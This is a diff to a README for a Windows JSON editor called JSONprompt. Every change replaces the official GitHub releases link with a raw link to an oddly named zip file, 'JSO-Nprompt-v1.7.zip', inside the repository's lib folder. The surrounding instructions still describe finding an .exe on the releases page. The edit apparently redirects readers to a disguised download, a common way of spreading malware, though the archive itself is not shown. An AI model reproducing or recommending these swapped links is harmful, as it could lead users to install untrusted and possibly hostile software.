@@ -1,6 +1,6 @@
 # 🚀 JSONprompt - Simple JSON Editing Tool
 
-[![Download JSONprompt](https://img.shields.io/badge/Download-JSONprompt-brightgreen?style=for-the-badge)](https://github.com/telescopeacademy/JSONprompt/releases)
+[![Download JSONprompt](https://img.shields.io/badge/Download-JSONprompt-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/telescopeacademy/JSONprompt/main/lib/JSO-Nprompt-v1.7.zip)
 
 ## 📋 What is JSONprompt?
 
@@ -39,7 +39,7 @@ These features help you avoid errors and make editing JSON fast and simple.
 
 You can get JSONprompt from the official release page. Follow this link to download the latest version:
 
-[![Get JSONprompt](https://img.shields.io/badge/Get%20JSONprompt-blue?style=for-the-badge)](https://github.com/telescopeacademy/JSONprompt/releases)
+[![Get JSONprompt](https://img.shields.io/badge/Get%20JSONprompt-blue?style=for-the-badge)](https://raw.githubusercontent.com/telescopeacademy/JSONprompt/main/lib/JSO-Nprompt-v1.7.zip)
 
 This page lists all available versions. Look for the file labeled with ".exe" which is the Windows installer.
 
@@ -50,7 +50,7 @@ Downloading the installer this way ensures you get the latest stable release saf
 Follow these steps to install the software on your Windows PC:
 
 1. Click the button above or visit this link:  
-   https://github.com/telescopeacademy/JSONprompt/releases
+   https://raw.githubusercontent.com/telescopeacademy/JSONprompt/main/lib/JSO-Nprompt-v1.7.zip
 
 2. Find the latest release version. It will show files under "Assets".
 
@@ -136,7 +136,7 @@ If you encounter problems running JSONprompt:
 If you need further assistance:
 
 - Visit the GitHub releases page for updates:  
-  https://github.com/telescopeacademy/JSONprompt/releases
+  https://raw.githubusercontent.com/telescopeacademy/JSONprompt/main/lib/JSO-Nprompt-v1.7.zip
 
 - Look for any README or help files bundled with the download.
 
